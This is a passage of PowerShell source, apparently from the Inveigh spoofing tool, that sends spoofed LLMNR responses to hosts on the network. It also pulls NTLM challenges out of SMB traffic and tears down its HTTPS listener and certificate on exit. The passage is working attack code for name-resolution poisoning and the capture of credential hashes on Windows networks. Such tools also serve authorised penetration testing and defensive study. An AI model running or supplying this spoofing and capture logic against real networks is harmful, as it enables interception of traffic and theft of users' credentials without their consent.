             $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
             $send_socket.SendBufferSize = 1024
             $destination_point = New-Object Net.IPEndpoint( $source_IP, $source_port_2 )
     
             if($LLMNR -eq 'y')
             {
                if ($hash.IP_capture_list -notcontains $source_IP)
                {
                    [void]$send_socket.sendTo( $LLMNR_response_packet, $destination_point )
                    $send_socket.Close( )
                    $LLMNR_response_message = "- spoofed response has been sent"
                }
                else
                {
                    $LLMNR_response_message = "- spoof suppressed due to previous capture"
                }
             }
                
             $LLMNR_query = [System.BitConverter]::ToString($payload_data[13..($payload_data.length - 4)])
             $LLMNR_query = $LLMNR_query -replace "-00",""
             $LLMNR_query = $LLMNR_query.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
             $LLMNR_query_string = New-Object System.String ($LLMNR_query,0,$LLMNR_query.Length)
             
             if($Output -eq 0 -or $Output -eq 1)
             {
                Write-Output "$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message`n"
             }
             
             if($Output -eq 0 -or $Output -eq 2)
             {
                # "$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message" |Out-File $log_out_file -Append
             }
              
        }
        }
        
        # Outgoing packets
        switch ($source_port)
        {
        445 { # SMB
            if($SMB -eq 'y')
            {
                # SMB versions
                if ($payload_data[4] -eq 255)
                {
                    $smb_version_offset = 0
                }
                else
                {
                    $smb_version_offset = 29
                }
            
                if (($payload_data[(86 + $smb_version_offset)] -eq 2) -and ($payload_data[(87 + $smb_version_offset)..(89 + $smb_version_offset)] -eq 0))
                {
                    $NTLM_challenge = [System.BitConverter]::ToString($payload_data[(102 + $smb_version_offset)..(109 + $smb_version_offset)]) -replace "-",""  
                }
            }
            }
        }
    }
    }
    finally
    {
        if($HTTPS -eq 'y')
        {
            Invoke-Expression -command "netsh http delete sslcert ipport=0.0.0.0:443" > $null
            
            try
            {
                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                $certificate_store.Open('ReadWrite')
                $certificate = $certificate_store.certificates.find("FindByThumbprint",$certificate_thumbprint,$FALSE)[0]
                $certificate_store.Remove($certificate)
                $certificate_store.Close()
            }
            catch
            {
                # write-warning 'SSL Certificate Deletion Error - Remove Manually'
            }
        }
            
        # write-warning "Inveigh exited at $(Get-Date -format 's')"
        
        if(($Output -eq 0) -or ($Output -eq 2))
        {
            # "Inveigh exited at $(Get-Date -format 's')" | Out-File $log_out_file -Append
        }
        
        try
        {
            $HTTP_listener_stop = $web_request.GetResponse()    
            $listener.Close()
            $listener.Stop()
            $binary_reader.Close()
            $memory_stream.Close()
            $sniffer_socket.Close()
        }
        catch {}
    }
}
